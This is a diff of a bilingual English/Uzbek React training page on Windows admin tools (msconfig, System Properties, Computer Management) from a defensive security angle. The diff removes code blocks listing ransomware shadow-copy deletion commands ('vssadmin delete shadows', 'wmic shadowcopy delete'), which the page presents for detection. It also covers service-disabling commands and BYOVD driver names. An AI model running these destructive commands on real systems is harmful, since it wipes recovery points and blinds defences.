-  OS boot info  → show driver names as they load (verbose)
-
-BCD equivalents (bcdedit):
-  bcdedit /set safeboot minimal      → Safe Boot Minimal
-  bcdedit /set safeboot network      → Safe Boot Network
-  bcdedit /deletevalue safeboot      → exit Safe Boot
-  bcdedit /set bootlog yes           → enable boot log`}</code></pre>
       <H2 num="§4" en="Services Tab" uz="" />
       <P>Shows all registered Windows services. "Hide all Microsoft services" focuses view on third-party software. Changes write directly to <code>HKLM\SYSTEM\CurrentControlSet\Services\[Name]\Start</code> — value 4 = disabled.</P>
       <Callout color="var(--c-attack)" icon="warning" titleEn="Attack Relevance" titleUz="">
         Attackers disable security services here or via <code>sc config</code> to blind defenses. Investigate any security service (Defender, Sysmon, EventLog) found unexpectedly disabled. Event ID 7036 = service state change.
       </Callout>
       <H2 num="§5" en="Tools Tab — Utility Shortcuts" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Tools Tab shortcuts (run directly without msconfig):
-  msinfo32.exe         → System Information
-  eventvwr.msc         → Event Viewer
-  compmgmt.msc         → Computer Management
-  sysdm.cpl            → System Properties
-  perfmon.exe          → Performance Monitor
-  resmon.exe           → Resource Monitor
-  taskmgr.exe          → Task Manager
-  regedit.exe          → Registry Editor
-  cmd.exe              → Command Prompt
-  rstrui.exe           → System Restore
-  wmimgmt.msc          → WMI Control
-  UserAccountControlSettings.exe  → UAC level slider`}</code></pre>
       <H2 num="§6" en="Practical Commands" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Open System Configuration
-msconfig
-
-# View current BCD boot entries
-bcdedit /enum all
-
-# Read boot log (after enabling in Boot tab + reboot)
-type %SystemRoot%\\ntbtlog.txt | findstr "DID NOT LOAD"
-
-# Check/change service start type
-sc query [ServiceName]
-sc config [ServiceName] start= disabled
-sc config [ServiceName] start= auto
-
-# Find unexpected disabled security services
-Get-Service | Where-Object {($_.Name -like "*Defender*" -or $_.Name -like "*Sysmon*") -and $_.Status -ne "Running"}
-
-# Last boot time
-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime`}</code></pre>
     </section>
   ) : (
     <section>
       <H2 num="§1" uz="Tizim Konfiguratsiyasi — msconfig.exe" en="" />
       <P><Term>msconfig.exe</Term> keyingi yuklashda kuchga kiradigan bayroqlar va afzalliklarni o'rnatadi. Ishlaydigan tizimni konfiguratsiya qilmaydi. Ishga tushish muammolarini bartaraf etish, drayver nizolarini tashxis qilish va Xavfsiz Yuklashni yoqish uchun ishlatiladi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`msconfig.exe — 5 Tab:
-┌──────────────────────────────────────────────────────────────┐
-│  [Umumiy]  [Yuklash]  [Xizmatlar]  [Ishga tushish]  [Vositalar] │
-└──────────────────────────────────────────────────────────────┘
-       │          │           │              │               │
-       ▼          ▼           ▼              ▼               ▼
-   Ishga      OT ro'y-    Yoqish/       Vazifa          Vositalar
-   tushish    xati        o'chirish     menejeriga      yorliqlari
-   turi       SafeBoot    MS bo'l-      yo'nalish       (regedit,
-  (Normal/    param.      magan xizm.   (Win10+)        perfmon...)`}</code></pre>
       <H2 num="§2" uz="Umumiy Tab — Ishga Tushish Turlari" en="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:12,margin:"14px 0"}}>
         {[
@@ -9467,53 +8076,13 @@ Get-Service | Where-Object {($_.Name -like "*Defender*" -or $_.Name -like "*Sysm
           </tbody>
         </table>
       </div>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:14}}><code>{`Boshqa Yuklash Tab parametrlari:
-  GUI bo'lmasiz   → Windows logotipini o'tkazib yuborish
-  Yuklash jurnali → %SystemRoot%\\ntbtlog.txt ga yozish
-  Asosiy video    → VGA 640x480 ga majburlay
-
-BCD ekvivalentlari:
-  bcdedit /set safeboot minimal   → Xavfsiz Yuklash Minimal
-  bcdedit /set safeboot network   → Xavfsiz Yuklash Tarmoq
-  bcdedit /deletevalue safeboot   → Xavfsiz Yuklashdan chiqish
-  bcdedit /set bootlog yes        → Yuklash jurnalini yoqish`}</code></pre>
       <H2 num="§4" uz="Xizmatlar Tab" en="" />
       <P>Barcha ro'yxatdan o'tgan Windows xizmatlarini ko'rsatadi. "Microsoft xizmatlarini yashirish" uchinchi tomon dasturlarini ajratadi. O'zgartirishlar to'g'ridan-to'g'ri <code>HKLM\SYSTEM\CurrentControlSet\Services\[Name]\Start</code> ga yoziladi — 4 qiymati = o'chirilgan.</P>
       <Callout color="var(--c-attack)" icon="warning" titleUz="Hujum bog'liqligi" titleEn="">
         Hujumchilar himoyani ko'r qilish uchun xavfsizlik xizmatlarini bu yerda yoki <code>sc config</code> orqali o'chiradi. Kutilmaganda o'chirilgan Defender, Sysmon, EventLog xizmatlarini tekshiring. Event ID 7036 = xizmat holati o'zgarishi.
       </Callout>
       <H2 num="§5" uz="Vositalar Tab — Yorliqlar" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Vositalar Tab yorliqlari (msconfig'siz to'g'ridan-to'g'ri ishlatish):
-  msinfo32.exe         → Tizim ma'lumotlari
-  eventvwr.msc         → Hodisa ko'ruvchi
-  compmgmt.msc         → Kompyuter boshqaruvi
-  sysdm.cpl            → Tizim xususiyatlari
-  perfmon.exe          → Ishlash monitori
-  resmon.exe           → Resurs monitori
-  taskmgr.exe          → Vazifa menejeri
-  regedit.exe          → Registry muharriri
-  rstrui.exe           → Tizimni tiklash
-  UserAccountControlSettings.exe  → UAC darajasi`}</code></pre>
       <H2 num="§6" uz="Amaliy Buyruqlar" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Tizim konfiguratsiyasini ochish
-msconfig
-
-# Joriy BCD yuklash yozuvlarini ko'rish
-bcdedit /enum all
-
-# Yuklash jurnalini o'qish (tab da yoqib, qayta yuklangandan so'ng)
-type %SystemRoot%\\ntbtlog.txt | findstr "DID NOT LOAD"
-
-# Xizmat ishga tushish turini tekshirish/o'zgartirish
-sc query [ServiceName]
-sc config [ServiceName] start= disabled
-sc config [ServiceName] start= auto
-
-# Kutilmaganda o'chirilgan xavfsizlik xizmatlarini topish
-Get-Service | Where-Object {($_.Name -like "*Defender*" -or $_.Name -like "*Sysmon*") -and $_.Status -ne "Running"}
-
-# Oxirgi yuklash vaqti
-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime`}</code></pre>
     </section>
   );
 }
@@ -9527,34 +8096,8 @@ function SectionAdvancedSystem() {
     <section>
       <H2 num="§1" en="Advanced System Settings — sysdm.cpl" uz="" />
       <P><Term>sysdm.cpl</Term> (System Properties) is the central panel for core system configuration. Access via <code>Win+Pause</code>, right-click This PC → Properties, or <code>sysdm.cpl</code> from Run. Five tabs: Computer Name, Hardware, Advanced, System Protection, Remote.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`sysdm.cpl — System Properties:
-┌──────────────────────────────────────────────────────────────────────┐
-│  [Computer Name]  [Hardware]  [Advanced]  [Sys Protection]  [Remote] │
-└──────────────────────────────────────────────────────────────────────┘
-        │               │           │              │               │
-        ▼               ▼           ▼              ▼               ▼
-   Hostname,       Device      Performance    System         Remote
-   domain/WG      Manager,    User Profiles  Restore,       Desktop,
-   join, DNS      driver      Startup &      Shadow         Remote
-   suffix         signing     Recovery       Copies         Assistance
-
-Direct launch shortcuts:
-  SystemPropertiesAdvanced.exe      → Advanced tab
-  SystemPropertiesProtection.exe    → System Protection tab
-  SystemPropertiesRemote.exe        → Remote tab
-  SystemPropertiesHardware.exe      → Hardware tab
-  SystemPropertiesComputerName.exe  → Computer Name tab`}</code></pre>
       <H2 num="§2" en="Computer Name / Domain Tab" uz="" />
       <P>Sets the machine's <Term>hostname</Term> (NetBIOS ≤15 chars) and <Term>workgroup</Term> or <Term>domain</Term> membership. Joining a domain installs a machine certificate, creates a computer object in AD, and enables Group Policy application.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Registry locations:
-  HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName
-  HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Domain
-
-PowerShell:
-  (Get-CimInstance Win32_ComputerSystem).Name       # hostname
-  (Get-CimInstance Win32_ComputerSystem).Domain     # domain
-  Rename-Computer -NewName "NEW-NAME" -Restart
-  Add-Computer -DomainName "corp.contoso.com" -Restart`}</code></pre>
       <H2 num="§3" en="Advanced Tab — Performance, Profiles, Recovery" uz="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr",gap:12,margin:"14px 0"}}>
         {[
@@ -9571,37 +8114,8 @@ PowerShell:
       </div>
       <H2 num="§4" en="Hardware Tab — Driver Signing (DSE)" uz="" />
       <P>64-bit Windows enforces <Term>Driver Signature Enforcement (DSE)</Term> — unsigned kernel drivers cannot load. Bypass requires either: disabling DSE at boot (F8 menu / bcdedit), or exploiting a vulnerable but signed driver (BYOVD — Bring Your Own Vulnerable Driver). Device Manager shows all drivers with signing status.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Check driver signing enforcement state
-bcdedit /enum | findstr "nointegritychecks"
-# If "Yes" → DSE disabled — SERIOUS RED FLAG
-
-# List all kernel drivers (look for unsigned ones)
-Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7045}  # new driver installed
-
-# Find unsigned drivers
-driverquery /SI | findstr "False"     # False = not signed
-
-# BYOVD examples (real incidents):
-#   RTCore64.sys (MSI AfterBurner)    → used by BlackByte, Lazarus
-#   DBUtil_2_3.sys (Dell)             → used by FinFisher
-#   gdrv.sys (GIGABYTE)               → used by various ransomware`}</code></pre>
       <H2 num="§5" en="System Protection Tab — VSS & Shadow Copies" uz="" />
       <P><Term>System Restore</Term> uses <Term>Volume Shadow Copy Service (VSS)</Term> to snapshot system files and registry. Restore points are stored in <code>C:\System Volume Information\</code>. Ransomware almost always deletes shadow copies immediately after encryption.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# List shadow copies
-vssadmin list shadows
-Get-ComputerRestorePoint
-
-# Create restore point (PowerShell as Admin)
-Checkpoint-Computer -Description "Before pentest" -RestorePointType APPLICATION_INSTALL
-
-# Mount a shadow copy for forensic access
-mklink /d C:\\VSS "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\"
-
-# RANSOMWARE shadow deletion (detect these commands):
-vssadmin delete shadows /all /quiet   # Event ID 8222
-wmic shadowcopy delete
-bcdedit /set {default} recoveryenabled No
-powershell.exe -c "(gwmi Win32_ShadowCopy).Delete()"  `}</code></pre>
       <H2 num="§6" en="Remote Tab — RDP" uz="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"14px 0"}}>
         <div style={{padding:14,background:"rgba(0,255,156,0.06)",border:"1px solid rgba(0,255,156,0.25)",borderRadius:10}}>
@@ -9614,53 +8128,13 @@ powershell.exe -c "(gwmi Win32_ShadowCopy).Delete()"  `}</code></pre>
         </div>
       </div>
       <H2 num="§7" en="Practical Commands" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Check DEP status
-bcdedit /enum | findstr " nx "
-Get-CimInstance Win32_OperatingSystem | Select-Object DataExecutionPrevention_Available
-
-# Paging file info
-Get-CimInstance Win32_PageFileUsage | Select-Object Name, AllocatedBaseSize, CurrentUsage
-
-# List user profiles with sizes
-Get-CimInstance Win32_UserProfile | Select-Object LocalPath, LastUseTime, Special
-
-# Check RDP status
-reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections
-
-# Enable RDP
-reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-netsh advfirewall firewall set rule group="remote desktop" new enable=yes`}</code></pre>
     </section>
   ) : (
     <section>
       <H2 num="§1" uz="Kengaytirilgan Tizim Sozlamalari — sysdm.cpl" en="" />
       <P><Term>sysdm.cpl</Term> (Tizim Xususiyatlari) — asosiy tizim konfiguratsiyasining markaziy paneli. <code>Win+Pause</code>, "Bu kompyuter"ga o'ng tugma → Xususiyatlar, yoki Run dan <code>sysdm.cpl</code> orqali kirish. Besh tab: Kompyuter nomi, Apparat, Kengaytirilgan, Tizim himoyasi, Masofadan.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`sysdm.cpl — Tizim Xususiyatlari:
-┌──────────────────────────────────────────────────────────────────────────┐
-│  [Kompyuter nomi]  [Apparat]  [Kengaytirilgan]  [Tizim himoyasi]  [Masofadan] │
-└──────────────────────────────────────────────────────────────────────────┘
-        │                │            │                  │               │
-        ▼                ▼            ▼                  ▼               ▼
-   Hostname,         Qurilma      Ishlash           Tizimni          Masofaviy
-   domen/WG         menejeri,    Foydalanuvchi     tiklash,         ish stoli,
-   qo'shilish,      drayver      profillari        Soya             Masofaviy
-   DNS qo'shimcha   imzolash     Ishga tushish     nusxalar         yordam
-
-To'g'ridan-to'g'ri yorliqlar:
-  SystemPropertiesAdvanced.exe     → Kengaytirilgan tab
-  SystemPropertiesProtection.exe   → Tizim himoyasi tab
-  SystemPropertiesRemote.exe       → Masofadan tab`}</code></pre>
       <H2 num="§2" uz="Kompyuter Nomi / Domen Tab" en="" />
       <P>Mashinaning <Term>hostname</Term> (NetBIOS ≤15 belgi) va <Term>ishchi guruh</Term> yoki <Term>domen</Term> a'zoligini o'rnatadi. Domenge qo'shilish mashina sertifikatini o'rnatadi, AD da kompyuter ob'ektini yaratadi va Guruh siyosatini qo'llash imkonini beradi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Registry joylari:
-  HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName
-  HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Domain
-
-PowerShell:
-  (Get-CimInstance Win32_ComputerSystem).Name       # hostname
-  (Get-CimInstance Win32_ComputerSystem).Domain     # domen
-  Rename-Computer -NewName "YANGI-NOM" -Restart
-  Add-Computer -DomainName "corp.contoso.com" -Restart`}</code></pre>
       <H2 num="§3" uz="Kengaytirilgan Tab — Ishlash, Profiller, Tiklanish" en="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr",gap:12,margin:"14px 0"}}>
         {[
@@ -9677,36 +8151,8 @@ PowerShell:
       </div>
       <H2 num="§4" uz="Apparat Tab — Drayver Imzolash (DSE)" en="" />
       <P>64-bitli Windows <Term>Drayver Imzo Tekshiruvi (DSE)</Term> ni amalga oshiradi — imzosiz kernel drayverlar yuklanmaydi. Chetlab o'tish: yuklashda DSE ni o'chirish (F8 / bcdedit) yoki zaif, lekin imzolangan drayverni ekspluatatsiya qilish (BYOVD). Qurilma menejeri barcha drayverlarni imzolash holati bilan ko'rsatadi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# DSE holati
-bcdedit /enum | findstr "nointegritychecks"
-# "Yes" bo'lsa → DSE o'chirilgan — JIDDIY QIZIL BAYROQ
-
-# Imzosiz drayverlarni topish
-driverquery /SI | findstr "False"     # False = imzosiz
-
-# Yangi drayver o'rnatilgan (Event ID 7045)
-Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7045}
-
-# BYOVD real misollar:
-#   RTCore64.sys (MSI AfterBurner)    → BlackByte, Lazarus
-#   DBUtil_2_3.sys (Dell)             → FinFisher
-#   gdrv.sys (GIGABYTE)               → turli ransomware`}</code></pre>
       <H2 num="§5" uz="Tizim Himoyasi Tab — VSS va Soya Nusxalar" en="" />
       <P><Term>Tizimni Tiklash</Term> tizim fayllarini va registry ni snapshot qilish uchun <Term>VSS (Volume Shadow Copy Service)</Term> dan foydalanadi. Tiklash nuqtalari <code>C:\System Volume Information\</code> da saqlanadi. Ransomware shifrlashdan so'ng deyarli har doim soya nusxalarni o'chiradi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Soya nusxalarni ko'rish
-vssadmin list shadows
-Get-ComputerRestorePoint
-
-# Tiklash nuqtasini yaratish
-Checkpoint-Computer -Description "Pentest oldidan" -RestorePointType APPLICATION_INSTALL
-
-# Forensics uchun soya nusxani ulash
-mklink /d C:\\VSS "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\"
-
-# RANSOMWARE soya nusxani o'chirish (bu buyruqlarni aniqlang):
-vssadmin delete shadows /all /quiet
-wmic shadowcopy delete
-bcdedit /set {default} recoveryenabled No`}</code></pre>
       <H2 num="§6" uz="Masofadan Tab — RDP" en="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"14px 0"}}>
         <div style={{padding:14,background:"rgba(0,255,156,0.06)",border:"1px solid rgba(0,255,156,0.25)",borderRadius:10}}>
@@ -9719,22 +8165,6 @@ bcdedit /set {default} recoveryenabled No`}</code></pre>
         </div>
       </div>
       <H2 num="§7" uz="Amaliy Buyruqlar" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# DEP holatini tekshirish
-bcdedit /enum | findstr " nx "
-
-# Almashtirish fayli ma'lumotlari
-Get-CimInstance Win32_PageFileUsage | Select-Object Name, AllocatedBaseSize, CurrentUsage
-
-# Foydalanuvchi profillarini ko'rish
-Get-CimInstance Win32_UserProfile | Select-Object LocalPath, LastUseTime, Special
-
-# RDP holatini tekshirish
-reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections
-# 0 = yoqilgan, 1 = o'chirilgan
-
-# RDP ni yoqish
-reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-netsh advfirewall firewall set rule group="remote desktop" new enable=yes`}</code></pre>
     </section>
   );
 }
@@ -9748,27 +8178,6 @@ function SectionComputerMgmt() {
     <section>
       <H2 num="§1" en="Computer Management — compmgmt.msc" uz="" />
       <P><Term>Computer Management</Term> (compmgmt.msc) is an MMC snap-in that aggregates the most essential Windows administrative tools. Access via right-click Start → Computer Management, or <code>compmgmt.msc</code> from Run. Supports connecting to remote machines via Action → Connect to another computer.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Computer Management Tree (compmgmt.msc):
-📁 Computer Management (Local)
- ├─📁 System Tools
- │   ├─📋 Task Scheduler        → scheduled tasks tree + library
- │   ├─📰 Event Viewer          → Windows Logs, App & Services Logs
- │   ├─📂 Shared Folders
- │   │    ├─ Shares             → all network shares incl. C$, ADMIN$, IPC$
- │   │    ├─ Sessions           → connected network users (live)
- │   │    └─ Open Files         → files locked by network users
- │   ├─👥 Local Users & Groups
- │   │    ├─ Users              → all local accounts
- │   │    └─ Groups             → Administrators, Users, RDP Users...
- │   ├─📈 Performance
- │   │    ├─ Performance Monitor → real-time counter graphs
- │   │    └─ Data Collector Sets → scheduled performance logging
- │   └─⚙  Device Manager        → hardware tree by category
- ├─💾 Storage
- │   └─ Disk Management          → graphical partition editor
- └─⚙  Services and Applications
-      ├─ Services                 → full service management GUI
-      └─ WMI Control              → WMI namespace permissions`}</code></pre>
       <H2 num="§2" en="Shared Folders — Hidden Admin Shares" uz="" />
       <P>The <Term>Shared Folders</Term> node is critical for security auditing. It exposes every network share — including <Term>administrative shares</Term> hidden from browse lists but always present on domain machines.</P>
       <div style={{overflowX:"auto",marginTop:10}}>
@@ -9791,24 +8200,6 @@ function SectionComputerMgmt() {
         </table>
       </div>
       <H2 num="§3" en="Local Users and Groups" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Key Built-in Groups (Local):
-  Administrators        → full control; S-1-5-32-544
-  Users                 → standard users; S-1-5-32-545
-  Guests                → very limited; S-1-5-32-546
-  Remote Desktop Users  → RDP access; S-1-5-32-555
-  Remote Mgmt Users     → WinRM / PSRemoting; S-1-5-32-580
-  Backup Operators      → bypass file ACLs for backup — dangerous if abused
-  Event Log Readers     → read logs without admin rights
-
-Security checks:
-  # Unexpected members in Administrators
-  Get-LocalGroupMember -Group "Administrators"
-
-  # Accounts with no password required
-  Get-LocalUser | Where-Object {$_.PasswordRequired -eq $false}
-
-  # Disabled built-in accounts (Guest, Administrator)
-  Get-LocalUser | Where-Object {$_.Enabled -eq $false}`}</code></pre>
       <H2 num="§4" en="Performance Monitor — Security Use" uz="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"14px 0"}}>
         <div style={{padding:14,background:"rgba(0,255,156,0.06)",border:"1px solid rgba(0,255,156,0.25)",borderRadius:10}}>
@@ -9826,75 +8217,12 @@ Security checks:
         Any WMI subscription you didn't create is suspicious. Autoruns.exe (Sysinternals WMI tab) reveals them. Removal: <code>Get-WMIObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject</code>. Monitor with Sysmon Event ID 19, 20, 21.
       </Callout>
       <H2 num="§6" en="Disk Management — Key Concepts" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Partition Types (GPT):
-  EFI System Partition (ESP) → FAT32, ~100-550 MB, hidden mount
-  Microsoft Reserved (MSR)   → 16 MB, no drive letter, GPT metadata
-  Basic Data Partition        → NTFS / exFAT / FAT32 data volumes
-  Windows Recovery (WinRE)   → ~500 MB-1 GB, no drive letter
-
-Disk States:
-  Online       → healthy and accessible
-  Offline      → explicitly disconnected or SAN policy
-  Missing      → dynamic disk with lost connectivity
-  Failed redund→ RAID volume degraded
-
-PowerShell alternatives to Disk Management GUI:
-  Get-Disk          # list physical disks
-  Get-Partition     # list all partitions
-  Get-Volume        # list all volumes / drive letters
-  diskpart          # interactive command-line partition tool`}</code></pre>
       <H2 num="§7" en="Practical Commands" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Open individual snap-ins
-compmgmt.msc   lusrmgr.msc   diskmgmt.msc   services.msc
-perfmon.msc    wmimgmt.msc   eventvwr.msc   taskschd.msc
-
-# List all network shares
-Get-SmbShare | Select-Object Name, Path, Description
-net share
-
-# Active SMB sessions
-Get-SmbSession | Select-Object ClientComputerName, ClientUserName, NumOpens
-net session
-
-# Open files on shares
-Get-SmbOpenFile | Select-Object SessionId, ClientUserName, Path
-
-# WMI persistence detection
-Get-WMIObject -Namespace "root\\subscription" -Class "__EventFilter"
-Get-WMIObject -Namespace "root\\subscription" -Class "__EventConsumer"
-Get-WMIObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding"
-
-# Connect to remote computer management
-$s = New-PSSession -ComputerName REMOTE-PC; Enter-PSSession $s
-
-# Disk info
-Get-Disk; Get-Partition; Get-Volume`}</code></pre>
     </section>
   ) : (
     <section>
       <H2 num="§1" uz="Kompyuter Boshqaruvi — compmgmt.msc" en="" />
       <P><Term>Kompyuter Boshqaruvi</Term> (compmgmt.msc) — eng muhim Windows boshqaruv vositalarini jamlagan MMC snap-in. Boshlash → o'ng tugma → Kompyuter Boshqaruvi, yoki Run dan <code>compmgmt.msc</code> orqali kirish. Masofaviy mashinalarga Action → Connect to another computer orqali ulanishni qo'llab-quvvatlaydi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Kompyuter Boshqaruvi Daraxti (compmgmt.msc):
-📁 Kompyuter Boshqaruvi (Mahalliy)
- ├─📁 Tizim Vositalari
- │   ├─📋 Vazifa Rejalashtiruvchi  → rejalashtirilgan vazifalar daraxti
- │   ├─📰 Hodisa Ko'ruvchi         → Windows Jurnallari, Ilova Jurnallari
- │   ├─📂 Ulashilgan Papkalar
- │   │    ├─ Ulashimlar            → C$, ADMIN$, IPC$ bilan barcha ulashimlar
- │   │    ├─ Sessiyalar            → ulangan tarmoq foydalanuvchilari (jonli)
- │   │    └─ Ochiq Fayllar         → tarmoq foydalanuvchilari qulflagan fayllar
- │   ├─👥 Mahalliy Foydalanuvchilar va Guruhlar
- │   │    ├─ Foydalanuvchilar      → barcha mahalliy hisoblar
- │   │    └─ Guruhlar              → Administratorlar, Foydalanuvchilar...
- │   ├─📈 Ishlash
- │   │    ├─ Ishlash Monitori      → real vaqt hisoblagich grafiklari
- │   │    └─ Ma'lumot Yig'uvchi    → rejalashtirilgan ishlash jurnali
- │   └─⚙  Qurilma Menejeri         → apparat daraxti kategoriyalar bo'yicha
- ├─💾 Saqlash
- │   └─ Disk Boshqaruvi            → grafik bo'lim muharriri
- └─⚙  Xizmatlar va Ilovalar
-      ├─ Xizmatlar                  → to'liq xizmat boshqaruvi GUI
-      └─ WMI Nazorati               → WMI nom maydoni ruxsatlari`}</code></pre>
       <H2 num="§2" uz="Ulashilgan Papkalar — Yashirin Admin Ulashimlari" en="" />
       <P><Term>Ulashilgan Papkalar</Term> tuguni xavfsizlik auditi uchun kritik. U ko'rib chiqish ro'yxatlaridan yashirilgan, lekin domen mashinalarida har doim mavjud bo'lgan <Term>administrator ulashimlari</Term> bilan barcha tarmoq ulashimlarini ko'rsatadi.</P>
       <div style={{overflowX:"auto",marginTop:10}}>
@@ -9917,24 +8245,6 @@ Get-Disk; Get-Partition; Get-Volume`}</code></pre>
         </table>
       </div>
       <H2 num="§3" uz="Mahalliy Foydalanuvchilar va Guruhlar" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Asosiy O'rnatilgan Guruhlar (Mahalliy):
-  Administratorlar       → to'liq nazorat; S-1-5-32-544
-  Foydalanuvchilar       → standart foydalanuvchilar; S-1-5-32-545
-  Mehmonlar              → juda cheklangan; S-1-5-32-546
-  Masofaviy Ish Stoli    → RDP kirish; S-1-5-32-555
-  Masofaviy Boshqaruv    → WinRM / PSRemoting; S-1-5-32-580
-  Backup Operators       → fayl ACL ni chetlab o'tish — suiiste'molda XAVFLI
-  Event Log Readers      → admin huquqsiz jurnallarni o'qish
-
-Xavfsizlik tekshiruvlari:
-  # Kutilmagan Administrators a'zolari
-  Get-LocalGroupMember -Group "Administrators"
-
-  # Parol talab qilinmaydigan hisoblar
-  Get-LocalUser | Where-Object {$_.PasswordRequired -eq $false}
-
-  # O'chirilgan o'rnatilgan hisoblar
-  Get-LocalUser | Where-Object {$_.Enabled -eq $false}`}</code></pre>
       <H2 num="§4" uz="Ishlash Monitori — Xavfsizlik Qo'llanilishi" en="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"14px 0"}}>
         <div style={{padding:14,background:"rgba(0,255,156,0.06)",border:"1px solid rgba(0,255,156,0.25)",borderRadius:10}}>
@@ -9952,28 +8262,6 @@ Xavfsizlik tekshiruvlari:
         Siz yaratmagan har qanday WMI obunasi shubhali. Autoruns.exe (Sysinternals WMI tab) ularni ko'rsatadi. O'chirish: <code>Get-WMIObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject</code>. Sysmon Event ID 19, 20, 21 bilan kuzating.
       </Callout>
       <H2 num="§6" uz="Amaliy Buyruqlar" en="" />
